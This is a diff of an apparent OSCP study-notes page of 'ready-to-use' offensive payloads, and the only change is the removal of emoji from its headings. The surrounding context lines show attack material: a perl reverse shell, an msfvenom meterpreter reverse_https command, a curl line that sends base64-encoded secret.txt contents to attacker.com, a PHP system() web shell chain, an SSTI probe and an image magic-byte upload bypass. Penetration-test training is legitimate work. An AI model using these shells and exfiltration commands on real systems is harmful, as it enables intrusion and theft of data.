@@ -4,13 +4,13 @@ description: Ready-to-use reverse shells, web payloads, and exploit code
 tags: [payloads, shells, oscp]
 ---
 
-# 💾 Payloads & Pre-built Shells
+#  Payloads & Pre-built Shells
 
 > Ready-to-use payloads for common scenarios. Always customize with your attacker IP/port before use.
 
 ---
 
-## 🐚 Reverse Shell One-Liners
+##  Reverse Shell One-Liners
 
 ### Linux / Bash
 
@@ -64,7 +64,7 @@ perl -e 'use Socket;$i="10.10.14.XXX";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpr
 
 ---
 
-## 🪟 Windows Payloads
+##  Windows Payloads
 
 ### PowerShell Reverse Shell
 
@@ -105,7 +105,7 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.XXX LPORT=8443 -f p
 
 ---
 
-## 💻 Web Application Payloads
+##  Web Application Payloads
 
 ### SQL Injection Payloads
 
@@ -163,7 +163,7 @@ ${7*7}
 
 ---
 
-## 📝 File Upload Bypass Payloads
+##  File Upload Bypass Payloads
 
 ### Double Extension
 
@@ -199,7 +199,7 @@ printf '\xFF\xD8\xFF\xE0' | cat - shell.jpg > shell_final.jpg
 
 ---
 
-## 🔐 Privilege Escalation Payloads
+##  Privilege Escalation Payloads
 
 ### Linux SUID Exploitation
 
@@ -228,7 +228,7 @@ chmod u+s suid_shell
 
 ---
 
-## 🔗 Exfiltration Payloads
+##  Exfiltration Payloads
 
 ### DNS Exfiltration
 
@@ -251,7 +251,7 @@ curl -H "X-Data: $(cat secret.txt | base64)" http://attacker.com/log
 
 ---
 
-## 🛠️ Generator Tools
+##  Generator Tools
 
 ### MSFVenom (Metasploit Payload Generator)
 
@@ -278,7 +278,7 @@ python3 php_filter_chain_generator.py --chain '<?= system($_GET["cmd"]); ?>'
 
 ---
 
-## 🎯 Quick Reference
+##  Quick Reference
 
 | Scenario | Best Payload |
 |----------|--------------|
@@ -291,17 +291,17 @@ python3 php_filter_chain_generator.py --chain '<?= system($_GET["cmd"]); ?>'
 
 ---
 
-## ⚠️ OSCP Notes
+##  OSCP Notes
 
 - **Always test** payloads on a lab machine first
-- **Customize IPs/ports** before using (❌ Don't hardcode)
+- **Customize IPs/ports** before using ( Don't hardcode)
 - **Document payload** used in your writeup
 - **Keep evidence** of exploitation (screenshots)
 - **Understand what you're running** — no copy-paste without verification
 
 ---
 
-## 🔗 Related
+##  Related
 
 - [[../Tools-Reference/00-Tools-Index|Tools Reference]]
 - [[../Exploitation/00-Exploitation-Index|Exploitation Techniques]]
